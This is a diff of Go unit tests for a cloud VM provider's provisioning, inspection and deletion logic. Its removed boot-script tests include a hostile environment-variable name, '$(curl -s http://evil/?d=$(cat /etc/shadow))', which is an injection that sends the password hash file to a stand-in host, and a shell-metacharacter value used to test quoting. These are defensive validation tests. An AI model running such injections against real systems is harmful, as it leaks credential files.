@@ -2,19 +2,15 @@ package arker
 
 import (
 	"context"
+	"encoding/json"
 	"errors"
 	"fmt"
 	"net/http"
 	"net/http/httptest"
 	"strings"
 	"testing"
-	"time"
 
-	arkersdk "github.com/ArkerHQ/arker-sdk/go"
-
-	"github.com/google/uuid"
 	"github.com/omnara-ai/omnara/internal/machinepool/providers"
-	"github.com/omnara-ai/omnara/internal/storage/storeerr"
 )
 
 func TestArkerProviderProvisionForksByAllocationName(t *testing.T) {
@@ -24,7 +20,7 @@ func TestArkerProviderProvisionForksByAllocationName(t *testing.T) {
 
 	result, err := machineProvider.ProvisionMachine(
 		context.Background(), testInstallationID, testMachineID,
-		testProvisioning(testOptions()), "tok-1", nil,
+		testProvisioning(testOptions()), "tok-1", nil, true,
 	)
 	if err != nil {
 		t.Fatalf("provision: %v", err)
@@ -32,8 +28,8 @@ func TestArkerProviderProvisionForksByAllocationName(t *testing.T) {
 	if result.ProviderResourceID != testVMID {
 		t.Fatalf("resource id = %q, want %q", result.ProviderResourceID, testVMID)
 	}
-	if result.SandboxURL == "" {
-		t.Fatal("sandbox url is empty, so WakeMachine would have no endpoint")
+	if result.SandboxURL != "" {
+		t.Fatalf("sandbox url = %q, want none", result.SandboxURL)
 	}
 
 	_, body, _, _ := fake.snapshot()
@@ -60,17 +56,72 @@ func TestArkerProviderProvisionKeyIsStableAcrossAttempts(t *testing.T) {
 
 	for _, token := range []string{"attempt-1", "attempt-2"} {
 		if _, err := machineProvider.ProvisionMachine(
-			context.Background(), testInstallationID, testMachineID, config, token, nil,
+			context.Background(), testInstallationID, testMachineID, config, token, nil, true,
 		); err != nil {
 			t.Fatalf("provision under %s: %v", token, err)
 		}
 	}
 	keys, _, _, _ := fake.snapshot()
-	if len(keys) != 2 || keys[0] != keys[1] {
-		t.Fatalf("attempts sent keys %v, want one key for the machine", keys)
+	if len(keys) != 2 || keys[0] != name || keys[1] != name {
+		t.Fatalf("attempts sent keys %v, want the allocation name %q", keys, name)
 	}
-	if keys[0] != name {
-		t.Fatalf("key = %q, want the allocation name %q", keys[0], name)
+}
+
+func TestArkerProviderStartsTheDaemonInASessionWithTheMachineEnv(t *testing.T) {
+	fake := &fakeArker{}
+	machineProvider := newTestProvider(fake.start(t, testAllocationName(t)).URL)
+
+	if _, err := machineProvider.ProvisionMachine(
+		context.Background(), testInstallationID, testMachineID,
+		testProvisioning(testOptions()), "tok-1", map[string]string{"MY_VAR": "value", "MY-VAR": "dropped"}, true,
+	); err != nil {
+		t.Fatalf("provision: %v", err)
+	}
+	_, _, env, command := fake.snapshot()
+	var sessionID string
+	fake.record(func() { sessionID = fake.runSessionID })
+	if _, dropped := env["MY-VAR"]; dropped || env["OMNARA_MACHINE_TOKEN"] != "tok-1" || env["MY_VAR"] != "value" {
+		t.Fatalf("session env = %v", env)
+	}
+	if env[providers.ManagedBootstrapScriptEnvVar] != providers.ManagedBootScriptPayload() {
+		t.Fatal("session env is missing the bootstrap payload")
+	}
+	if command != daemonLauncherCommand || sessionID != "sess_1" {
+		t.Fatalf("daemon run = %q in session %q", command, sessionID)
+	}
+}
+
+func TestArkerProviderAdoptsOnlyALiveDaemon(t *testing.T) {
+	for _, test := range []struct {
+		name    string
+		state   string
+		command string
+		adopted bool
+	}{
+		{name: "pending", state: "pending", adopted: true},
+		{name: "running", state: "running", adopted: true},
+		{name: "completed", state: "completed"},
+		{name: "other command", state: "running", command: "sleep infinity"},
+	} {
+		t.Run(test.name, func(t *testing.T) {
+			fake := &fakeArker{existingRunState: test.state, existingRunCommand: test.command}
+			machineProvider := newTestProvider(fake.start(t, testAllocationName(t)).URL)
+
+			if _, err := machineProvider.ProvisionMachine(
+				context.Background(), testInstallationID, testMachineID,
+				testProvisioning(testOptions()), "tok-2", nil, true,
+			); err != nil {
+				t.Fatalf("provision: %v", err)
+			}
+			want := int64(1)
+			if test.adopted {
+				want = 0
+			}
+			if fake.sessions.Load() != want || fake.runs.Load() != want {
+				t.Fatalf("started %d sessions and %d runs, want %d of each",
+					fake.sessions.Load(), fake.runs.Load(), want)
+			}
+		})
 	}
 }
 
@@ -80,125 +131,49 @@ func TestArkerProviderProvisionReportsAVMThatIsNotThisMachine(t *testing.T) {
 
 	result, err := machineProvider.ProvisionMachine(
 		context.Background(), testInstallationID, testMachineID,
-		testProvisioning(testOptions()), "tok-1", nil,
+		testProvisioning(testOptions()), "tok-1", nil, true,
 	)
-	if err == nil || !strings.Contains(err.Error(), "does not belong to machine") {
+	if !errors.Is(err, errNotThisMachine) {
 		t.Fatalf("adopting a foreign vm must fail, got %v", err)
 	}
-	if result.ProviderResourceID != testVMID {
-		t.Fatalf("the id must come back so cleanup can remove the vm, got %q",
-			result.ProviderResourceID)
+	if result.ProviderResourceID != "" {
+		t.Fatalf("resource id = %q, want a foreign vm left unrecorded", result.ProviderResourceID)
 	}
 	if fake.deletes.Load() != 0 {
-		t.Fatalf("issued %d deletes; deleting here spends the machine's key for good",
-			fake.deletes.Load())
-	}
-}
-
-func TestArkerProviderDeleteRemovesAVMWhoseNameIsUnexpected(t *testing.T) {
-	fake := &fakeArker{vmName: "something-else-entirely"}
-	machineProvider := newTestProvider(fake.start(t, testAllocationName(t)).URL)
-
-	if err := machineProvider.DeleteMachine(
-		context.Background(), testInstallationID, testMachineID,
-		testProvisioning(testOptions()), testVMID,
-	); err != nil {
-		t.Fatalf("delete by recorded id: %v", err)
-	}
-	if fake.deletes.Load() != 1 {
-		t.Fatalf("issued %d deletes; a VM nothing can remove is never cleaned up",
-			fake.deletes.Load())
+		t.Fatalf("issued %d deletes during provisioning", fake.deletes.Load())
 	}
 }
 
 func TestArkerProviderProvisionReportsTheResourceIDWhenTheDaemonFails(t *testing.T) {
-	fake := &fakeArker{writeStatus: http.StatusBadRequest}
+	fake := &fakeArker{sessionError: true}
 	machineProvider := newTestProvider(fake.start(t, testAllocationName(t)).URL)
 
 	result, err := machineProvider.ProvisionMachine(
 		context.Background(), testInstallationID, testMachineID,
-		testProvisioning(testOptions()), "tok-1", nil,
+		testProvisioning(testOptions()), "tok-1", nil, true,
 	)
 	if err == nil {
-		t.Fatal("expected the daemon handoff to fail")
+		t.Fatal("expected the daemon start to fail")
 	}
 	if result.ProviderResourceID != testVMID {
 		t.Fatalf("failed provision dropped the resource id: %q", result.ProviderResourceID)
 	}
 }
 
-func TestArkerProviderProvisionFailsWhenTheDaemonExitsNonZero(t *testing.T) {
-	fake := &fakeArker{daemonState: "completed", daemonExit: ptr(1)}
-	machineProvider := newTestProvider(fake.start(t, testAllocationName(t)).URL)
+func TestArkerProviderProvisionFailsWhenTheDaemonRunEnds(t *testing.T) {
+	for _, state := range []string{"completed", "failed"} {
+		t.Run(state, func(t *testing.T) {
+			fake := &fakeArker{runState: state}
+			machineProvider := newTestProvider(fake.start(t, testAllocationName(t)).URL)
 
-	_, err := machineProvider.ProvisionMachine(
-		context.Background(), testInstallationID, testMachineID,
-		testProvisioning(testOptions()), "tok-1", nil,
-	)
-	if err == nil || !strings.Contains(err.Error(), "instead of running") {
-		t.Fatalf("a dead daemon must fail the provision, got %v", err)
-	}
-}
-
-func TestArkerProviderDaemonKeepsTheTokenOutOfReadableFields(t *testing.T) {
-	fake := &fakeArker{}
-	machineProvider := newTestProvider(fake.start(t, testAllocationName(t)).URL)
-
-	if _, err := machineProvider.ProvisionMachine(
-		context.Background(), testInstallationID, testMachineID,
-		testProvisioning(testOptions()), "super-secret-token", nil,
-	); err != nil {
-		t.Fatalf("provision: %v", err)
-	}
-	_, _, env, command := fake.snapshot()
-	if command == "" {
-		t.Fatal("no run was issued, so the daemon never started")
-	}
-	if strings.Contains(command, "super-secret-token") {
-		t.Fatalf("daemon command carries the machine token: %s", command)
-	}
-	if _, present := env["OMNARA_MACHINE_TOKEN"]; present {
-		t.Fatalf("session env carries the machine token; keep credentials out of it: %v", env)
-	}
-	if fake.writes.Load() != 1 {
-		t.Fatalf("wrote %d files, want one boot script", fake.writes.Load())
-	}
-}
-
-func TestArkerBootScriptRemovesItselfFirst(t *testing.T) {
-	script, err := bootScript(map[string]string{"OMNARA_MACHINE_TOKEN": "secret"})
-	if err != nil {
-		t.Fatalf("build boot script: %v", err)
-	}
-	first, _, _ := strings.Cut(script, "\n")
-	if first != `rm -f "$0"` {
-		t.Fatalf("boot script starts with %q, want it to delete itself first", first)
-	}
-	if !strings.Contains(script, "export OMNARA_MACHINE_TOKEN='secret'") {
-		t.Fatalf("boot script does not export the env:\n%s", script)
-	}
-}
-
-func TestArkerBootScriptRejectsAnEnvNameThatIsNotAnIdentifier(t *testing.T) {
-	for _, hostile := range []string{
-		"$(curl -s http://evil/?d=$(cat /etc/shadow))",
-		"A\nid\nB",
-		"with-dash",
-		"1LEADING_DIGIT",
-	} {
-		if _, err := bootScript(map[string]string{hostile: "x"}); err == nil {
-			t.Fatalf("env name %q was rendered into the boot script", hostile)
-		}
-	}
-}
-
-func TestArkerBootScriptQuotesValues(t *testing.T) {
-	script, err := bootScript(map[string]string{"K": `a'b; id`})
-	if err != nil {
-		t.Fatalf("build boot script: %v", err)
-	}
-	if !strings.Contains(script, `export K='a'\''b; id'`) {
-		t.Fatalf("value was not safely quoted:\n%s", script)
+			_, err := machineProvider.ProvisionMachine(
+				context.Background(), testInstallationID, testMachineID,
+				testProvisioning(testOptions()), "tok-1", nil, true,
+			)
+			if err == nil || !strings.Contains(err.Error(), "instead of running") {
+				t.Fatalf("a %s daemon must fail the provision, got %v", state, err)
+			}
+		})
 	}
 }
 
@@ -213,18 +188,10 @@ func TestArkerProviderInspectFindsTheMachineByResourceID(t *testing.T) {
 	if err != nil || !found || id != testVMID {
 		t.Fatalf("inspect = (%q, %v, %v), want the provisioned id", id, found, err)
 	}
-}
-
-func TestArkerProviderInspectRejectsAVMBelongingToAnotherMachine(t *testing.T) {
-	fake := &fakeArker{vmName: "omnara-mch-somebodyelse"}
-	machineProvider := newTestProvider(fake.start(t, testAllocationName(t)).URL)
-
-	_, found, err := machineProvider.InspectMachine(
-		context.Background(), testInstallationID, testMachineID,
-		testProvisioning(testOptions()), testVMID,
-	)
-	if found || err == nil || !strings.Contains(err.Error(), "does not belong to machine") {
-		t.Fatalf("inspect of a foreign vm = (%v, %v), want an ownership error", found, err)
+	var lookup string
+	fake.record(func() { lookup = fake.lookup })
+	if lookup != "/v1/vms/"+testVMID {
+		t.Fatalf("looked up %q, want the recorded id", lookup)
 	}
 }
 
@@ -236,42 +203,95 @@ func TestArkerProviderInspectFindsAMachineWhoseIDWasNeverRecorded(t *testing.T) 
 		context.Background(), testInstallationID, testMachineID,
 		testProvisioning(testOptions()), "",
 	)
-	if err != nil || !found {
-		t.Fatalf("empty resource id = (%q, %v, %v), want the machine found by its name", id, found, err)
+	if err != nil || !found || id != testVMID {
+		t.Fatalf("inspect by name = (%q, %v, %v), want the vm id", id, found, err)
 	}
-	if id != testVMID {
-		t.Fatalf("resource id = %q, want the vm id %q and not the name looked up", id, testVMID)
+	var lookup string
+	fake.record(func() { lookup = fake.lookup })
+	if lookup != "/v1/vms/"+testAllocationName(t) {
+		t.Fatalf("looked up %q, want the allocation name", lookup)
 	}
 	if fake.forks.Load() != 0 {
 		t.Fatal("inspect must not create anything")
 	}
 }
 
-func TestArkerProviderInspectRejectsAMachineThatIsNotThisOne(t *testing.T) {
-	fake := &fakeArker{vmName: "someone-elses-machine"}
-	machineProvider := newTestProvider(fake.start(t, testAllocationName(t)).URL)
+func TestArkerProviderInspectRejectsAVMBelongingToAnotherMachine(t *testing.T) {
+	for _, resourceID := range []string{testVMID, ""} {
+		fake := &fakeArker{vmName: "omnara-mch-somebodyelse"}
+		machineProvider := newTestProvider(fake.start(t, testAllocationName(t)).URL)
 
-	_, found, err := machineProvider.InspectMachine(
-		context.Background(), testInstallationID, testMachineID,
-		testProvisioning(testOptions()), "",
-	)
-	if found || err == nil || !strings.Contains(err.Error(), "does not belong to machine") {
-		t.Fatalf("a name resolving to another machine = (%v, %v), want an ownership error", found, err)
+		_, found, err := machineProvider.InspectMachine(
+			context.Background(), testInstallationID, testMachineID,
+			testProvisioning(testOptions()), resourceID,
+		)
+		if found || !errors.Is(err, errNotThisMachine) {
+			t.Fatalf("inspect %q of a foreign vm = (%v, %v), want an ownership error", resourceID, found, err)
+		}
 	}
 }
 
-func TestArkerProviderDeleteRemovesTheMachine(t *testing.T) {
+func TestArkerProviderDeletesTheRecordedVMUsingOnlyItsRegion(t *testing.T) {
 	fake := &fakeArker{}
 	machineProvider := newTestProvider(fake.start(t, testAllocationName(t)).URL)
 
 	if err := machineProvider.DeleteMachine(
 		context.Background(), testInstallationID, testMachineID,
-		testProvisioning(testOptions()), testVMID,
+		testProvisioning(map[string]json.RawMessage{
+			"region":         json.RawMessage(`"aws-us-west-2"`),
+			"retired_option": json.RawMessage(`"value"`),
+		}), testVMID,
 	); err != nil {
 		t.Fatalf("delete: %v", err)
 	}
 	if fake.deletes.Load() != 1 {
 		t.Fatalf("issued %d deletes, want one", fake.deletes.Load())
+	}
+}
+
+func TestArkerProviderDeleteRefusesAVMBelongingToAnotherMachine(t *testing.T) {
+	fake := &fakeArker{vmName: "omnara-mch-somebodyelse"}
+	machineProvider := newTestProvider(fake.start(t, testAllocationName(t)).URL)
+
+	err := machineProvider.DeleteMachine(
+		context.Background(), testInstallationID, testMachineID,
+		testProvisioning(testOptions()), testVMID,
+	)
+	if !errors.Is(err, errNotThisMachine) {
+		t.Fatalf("deleting a foreign vm must fail, got %v", err)
+	}
+	if fake.deletes.Load() != 0 {
+		t.Fatalf("issued %d deletes for a foreign vm", fake.deletes.Load())
+	}
+}
+
+func TestArkerProviderDeleteFindsTheMachineByNameWhenTheRecordedIDIsGone(t *testing.T) {
+	name := testAllocationName(t)
+	deleted := make(chan string, 2)
+	mux := http.NewServeMux()
+	mux.HandleFunc("/v1/vms/", func(w http.ResponseWriter, r *http.Request) {
+		switch {
+		case r.Method == http.MethodDelete:
+			deleted <- r.URL.Path
+			fmt.Fprint(w, `{"deleted":true}`)
+		case r.URL.Path == "/v1/vms/"+name:
+			writeVM(w, name, "idle")
+		default:
+			w.WriteHeader(http.StatusNotFound)
+			fmt.Fprint(w, `{"error":{"code":"not_found","message":"gone"}}`)
+		}
+	})
+	server := httptest.NewServer(mux)
+	t.Cleanup(server.Close)
+
+	if err := newTestProvider(server.URL).DeleteMachine(
+		context.Background(), testInstallationID, testMachineID,
+		testProvisioning(testOptions()), "vmh-stale",
+	); err != nil {
+		t.Fatalf("delete: %v", err)
+	}
+	if got := <-deleted; got != "/v1/vms/"+testVMID {
+		t.Fatalf("deleted %s, want the vm found by name", got)
 	}
 }
 
@@ -298,41 +318,7 @@ func TestArkerProviderDeleteRequiresAResourceID(t *testing.T) {
 		testProvisioning(testOptions()), "",
 	)
 	if err == nil {
-		t.Fatal("delete without a resource id must fail rather than guess")
-	}
-}
-
-func TestArkerProviderWakeRunsANoOpCommand(t *testing.T) {
-	fake := &fakeArker{}
-	server := fake.start(t, testAllocationName(t))
-	machineProvider := newTestProvider(server.URL)
-
-	for i := range 2 {
-		if err := machineProvider.WakeMachine(context.Background(), providers.WakeMachineInput{
-			ProviderResourceID: testVMID,
-			SandboxURL:         server.URL,
-		}); err != nil {
-			t.Fatalf("wake attempt %d: %v", i+1, err)
-		}
-	}
-	if fake.runs.Load() != 2 {
-		t.Fatalf("wake issued %d runs, want one per call", fake.runs.Load())
-	}
-	if fake.forks.Load() != 0 {
-		t.Fatal("wake must never fork")
-	}
-}
-
-func TestArkerProviderReportsServerErrorsAsProviderUnavailable(t *testing.T) {
-	fake := &fakeArker{forkStatus: http.StatusServiceUnavailable}
-	machineProvider := newTestProvider(fake.start(t, testAllocationName(t)).URL)
-
-	_, err := machineProvider.ProvisionMachine(
-		context.Background(), testInstallationID, testMachineID,
-		testProvisioning(testOptions()), "tok-1", nil,
-	)
-	if !errors.Is(err, storeerr.ErrMachineProviderUnavailable) {
-		t.Fatalf("a 503 must be provider-unavailable so the pool backs off, got %v", err)
+		t.Fatal("delete without a resource id must fail")
 	}
 }
 
@@ -355,150 +341,12 @@ func TestArkerProviderPrepareProvisioningEchoesTheRequestedSize(t *testing.T) {
 	}
 }
 
-func TestArkerProviderAllocationNameIsStablePerMachine(t *testing.T) {
-	first := testAllocationName(t)
-	second := testAllocationName(t)
-	if first != second {
-		t.Fatalf("allocation name is not stable: %q then %q", first, second)
+func TestArkerProviderTargetsTheRegionEndpoint(t *testing.T) {
+	if got := (&provider{}).regionBaseURL("aws-us-west-2"); got != "https://aws-us-west-2.arker.ai/api" {
+		t.Fatalf("regional base url = %q", got)
 	}
-	other, err := providers.MachineAllocationName(testInstallationID, uuid.New())
-	if err != nil {
-		t.Fatalf("build allocation name: %v", err)
-	}
-	if other == first {
-		t.Fatal("two machines share an allocation name, so they would share a key")
-	}
-}
-
-func TestArkerProviderDaemonRunsInItsOwnSessionWithoutCreatingOne(t *testing.T) {
-	fake := &fakeArker{}
-	machineProvider := newTestProvider(fake.start(t, testAllocationName(t)).URL)
-
-	if _, err := machineProvider.ProvisionMachine(
-		context.Background(), testInstallationID, testMachineID,
-		testProvisioning(testOptions()), "tok-1", nil,
-	); err != nil {
-		t.Fatalf("provision: %v", err)
-	}
-	if fake.sessions.Load() != 0 {
-		t.Fatalf("created %d sessions; a session index is find-or-create", fake.sessions.Load())
-	}
-	if fake.runSessionIdx != daemonSessionIdx {
-		t.Fatalf("daemon ran at session index %d, want %d (0 is where plain runs land)",
-			fake.runSessionIdx, daemonSessionIdx)
-	}
-}
-
-func TestArkerProviderProvisionFailsWhenTheDaemonEndsInAnyTerminalState(t *testing.T) {
-	for _, dead := range []struct {
-		state string
-		exit  *int
-	}{
-		{state: "completed", exit: ptr(0)},
-		{state: "failed"},
-		{state: "cancelled"}, //nolint:misspell // the wire value.
-	} {
-		t.Run(dead.state, func(t *testing.T) {
-			fake := &fakeArker{daemonState: dead.state, daemonExit: dead.exit}
-			machineProvider := newTestProvider(fake.start(t, testAllocationName(t)).URL)
-
-			_, err := machineProvider.ProvisionMachine(
-				context.Background(), testInstallationID, testMachineID,
-				testProvisioning(testOptions()), "tok-1", nil,
-			)
-			if err == nil || !strings.Contains(err.Error(), "instead of running") {
-				t.Fatalf("a %s daemon must fail the provision, got %v", dead.state, err)
-			}
-		})
-	}
-}
-
-func TestArkerProviderProvisionFailsWhileTheDaemonRunStaysPending(t *testing.T) {
-	fake := &fakeArker{daemonState: "pending"}
-	machineProvider := newTestProvider(fake.start(t, testAllocationName(t)).URL)
-
-	_, err := machineProvider.ProvisionMachine(
-		context.Background(), testInstallationID, testMachineID,
-		testProvisioning(testOptions()), "tok-1", nil,
-	)
-	if err == nil || !strings.Contains(err.Error(), "pending") {
-		t.Fatalf("a run queued behind another is not a started daemon, got %v", err)
-	}
-}
-
-func TestArkerDaemonStartTimeoutFitsInsideTheProvisioningBudget(t *testing.T) {
-	if defaultDaemonStartTimeout >= provisioningTimeout {
-		t.Fatalf(
-			"daemon wait %s must finish before the manager's %s deadline, or a stuck boot "+
-				"is reported as a cancellation instead of the state it was stuck in",
-			defaultDaemonStartTimeout, provisioningTimeout,
-		)
-	}
-}
-
-func TestArkerWakeAvoidsTheSessionUserRunsLandOn(t *testing.T) {
-	if wakeSessionIdx == 0 {
-		t.Fatal("waking on session 0 queues behind user runs")
-	}
-	if wakeSessionIdx == daemonSessionIdx {
-		t.Fatal("waking on the daemon's session would interrupt it")
-	}
-}
-
-func TestArkerProviderProvisionAlwaysWritesCurrentCredentials(t *testing.T) {
-	fake := &fakeArker{daemonAliveIn: "running"}
-	machineProvider := newTestProvider(fake.start(t, testAllocationName(t)).URL)
-
-	if _, err := machineProvider.ProvisionMachine(
-		context.Background(), testInstallationID, testMachineID,
-		testProvisioning(testOptions()), "tok-1", nil,
-	); err != nil {
-		t.Fatalf("provision: %v", err)
-	}
-	if fake.writes.Load() != 1 {
-		t.Fatalf("wrote the boot script %d times, want it written with this attempt's token", fake.writes.Load())
-	}
-	if fake.runs.Load() != 1 {
-		t.Fatalf("started %d daemons, want the daemon started for this attempt", fake.runs.Load())
-	}
-}
-
-// Bounding the wait by the caller's context must not shorten it below the
-// settle window. Success is only concluded once the daemon has held `running`
-// through that window, so a hard deadline inside it fails a boot that is doing
-// nothing wrong -- the opposite of what the bounding is for.
-func TestWaitForDaemonDoesNotFailAHealthyBootOnAShortContext(t *testing.T) {
-	daemonSettleWindow = 40 * time.Millisecond
-	daemonStartTimeout = 5 * time.Second
-	t.Cleanup(func() {
-		daemonSettleWindow = liveTestSettleWindow
-		daemonStartTimeout = liveTestStartTimeout
-	})
-
-	fake := &fakeArker{}
-	server := fake.start(t, testAllocationName(t))
-	client, err := arkersdk.New(arkersdk.Options{APIKey: "ark_test", BaseURL: server.URL})
-	if err != nil {
-		t.Fatalf("sdk client: %v", err)
-	}
-	vm := client.VM(testVMID)
-	started, err := vm.Run(context.Background(), arkersdk.RunRequest{
-		Command:          daemonCommand,
-		SessionIdx:       arkersdk.Ptr(daemonSessionIdx),
-		TimeToBackground: arkersdk.Ptr(0),
-	})
-	if err != nil {
-		t.Fatalf("start the daemon: %v", err)
-	}
-
-	// Less context left than settle window + margin. The clamp must not drag the
-	// hard deadline in front of the settle window.
-	ctx, cancel := context.WithTimeout(context.Background(), daemonSettleWindow+daemonDeadlineMargin/2)
-	defer cancel()
-	if err := waitForDaemon(ctx, vm, started.RunID); err != nil {
-		if strings.Contains(err.Error(), "is still") {
-			t.Fatalf("a healthy running daemon was reported stuck: %v", err)
-		}
-		t.Logf("ended on the context rather than blaming the daemon: %v", err)
+	overridden := &provider{apiBaseURL: "https://arker.example/api"}
+	if got := overridden.regionBaseURL("aws-us-west-2"); got != "https://arker.example/api" {
+		t.Fatalf("overridden base url = %q", got)
 	}
 }
